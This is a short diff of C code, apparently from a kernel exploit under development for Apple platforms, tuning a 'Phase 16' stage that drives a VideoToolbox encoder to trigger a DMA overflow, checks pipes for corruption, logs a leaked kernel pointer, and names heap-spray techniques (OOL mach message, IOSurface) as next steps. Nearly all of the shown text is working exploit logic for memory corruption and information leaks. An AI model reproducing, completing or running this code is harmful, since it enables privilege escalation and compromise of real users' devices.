@@ -21441,7 +21441,7 @@ new_modes:
                     /* 16d: Encode multiple frames to trigger DMA overflow.
                      * Force keyframes to ensure full surface creation. */
                     int enc_ok = 0, enc_err = 0;
-                    for (int ei = 0; ei < 10; ei++) {
+                    for (int ei = 0; ei < 4; ei++) {
                         g_encode_done = 0;
                         g_cb_status = -999;
 
@@ -21471,8 +21471,8 @@ new_modes:
                         if (fp) CFRelease(fp);
                         CVPixelBufferRelease(pb);
 
-                        /* Wait for callback (max 2s) */
-                        for (int w = 0; w < 200 && !g_encode_done; w++)
+                        /* Wait for callback (max 1s) */
+                        for (int w = 0; w < 100 && !g_encode_done; w++)
                             usleep(10000);
 
                         if (g_cb_status == 0) enc_ok++;
@@ -21486,7 +21486,7 @@ new_modes:
 
                     VTCompressionSessionInvalidate(p16_enc);
                     CFRelease(p16_enc);
-                    usleep(200000); /* Let DMA settle */
+                    usleep(50000); /* Let DMA settle */
 
                     /* 16e: Check pipes for corruption */
                     int p16_checked = 0, p16_corrupted = 0;
@@ -21578,6 +21578,8 @@ new_modes:
                 rlog("  Next: try OOL mach msg spray or IOSurface re-spray.\n");
             }
 
+            rlog("\n*** PHASE 16 SUMMARY: total_corrupted=%d leaked_ptr=0x%016llx ***\n",
+                p16_total_corrupted, (unsigned long long)p16_leaked_ptr);
             rlog("--- Phase 16 (DMA overflow) complete ---\n");
         }
 
